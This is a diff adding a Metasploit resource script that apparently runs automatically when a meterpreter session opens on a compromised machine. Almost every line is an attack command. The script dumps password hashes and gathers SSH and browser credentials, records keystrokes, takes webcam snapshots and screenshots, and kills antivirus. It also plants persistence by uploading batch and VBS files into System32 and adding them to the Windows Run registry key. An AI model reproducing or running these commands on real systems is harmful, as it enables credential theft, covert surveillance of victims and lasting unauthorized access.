@@ -1,0 +1,103 @@
+######################################################################
+# This file contains several post exploitation modules that  can be  #
+# used in config the 'opensource/modules/post-auto.rc' the resource  #
+# file will be called when the HANDLER recibes the remote connection #
+# (meterpreter session open), and it will automatic lunch all post   #
+# exploitation modules or commands that are written (one-per-line).  #
+######################################################################
+
+
+
+# multiple OS post modules
+# ------------------------
+run post/multi/gather/env
+run post/multi/gather/ssh_creds
+run post/multi/gather/firefox_creds
+run post/multi/gather/skype_enum
+
+
+# Windows post modules
+# --------------------
+run post/windows/gather/checkvm
+run post/windows/manage/migrate
+run post/windows/gather/hashdump
+run post/windows/gather/dumplinks
+run post/windows/gather/enum_snmp
+run post/windows/gather/enum_shares
+run post/windows/gather/arp_scanner
+run post/windows/gather/usb_history
+run post/windows/capture/keylog_recorder
+run post/windows/gather/enum_applications
+run post/windows/gather/credential_collector
+run post/windows/gather/enum_logged_on_users
+
+
+# Linux post modules
+# ------------------
+run post/linux/gather/checkvm
+run post/linux/gather/enum_system
+run post/linux/gather/enum_configs
+run post/linux/gather/enum_network
+run post/linux/gather/enum_protections
+run post/linux/gather/enum_users_history
+
+
+# mac OSX post modules
+# --------------------
+run post/osx/admin/say
+run post/osx/gather/enum_osx
+
+
+# meterpreter core commands
+# -------------------------
+killav
+run migrate -n wininit.exe
+screenshot -v -p /home/pedr0/hello.jpeg -v true
+
+
+# Persiste 'meterpreter powershell.bat attack'
+# --------------------------------------------
+sysinfo
+run migrate -n wininit.exe
+upload /var/www/powershell.bat C:\\Windows\\System32\\powershell.bat
+upload /var/www/hidden.vbs C:\\Windows\\System32\\hidden.vbs
+reg setval -k HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run -v persistence -d 'C:\Windows\System32\hidden.vbs'
+reg enumkey -k HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run
+
+
+# diferent postauto.rc configuration (windows)
+# --------------------------------------------
+sysinfo
+getuid
+getpid
+lpwd
+pwd
+ps
+idletime
+run migrate -n explorer.exe
+run post/windows/gather/hashdump
+run post/windows/gather/enum_applications
+run post/windows/gather/credential_collector
+run post/multi/gather/firefox_creds
+search -f *.doc
+show_mount
+netstat
+webcam_snap -i 1 -p /home/pedr0/opensource/logs/targetcam.jpeg -v true
+
+
+# Resource File + ERB scripting in post-exploitation
+# --------------------------------------------------
+<ruby>
+chipTech = client.fs.file.expand_path("%NUMBER_OF_PROCESSORS%")
+print_good("Thanks mr pedro ubuntu for ERB scripting in post-exploitation")
+print_good("target ip:#{host.address} N of processors:#{chipTech}")
+</ruby>
+
+sysinfo
+run migrate -n wininit.exe
+screenshot -v -p /root/hacked-CVE-2014-0515.jpeg -v true
+run post/windows/gather/enum_applications
+reg enumkey -k HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run
+reg enumkey -k HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System
+
+
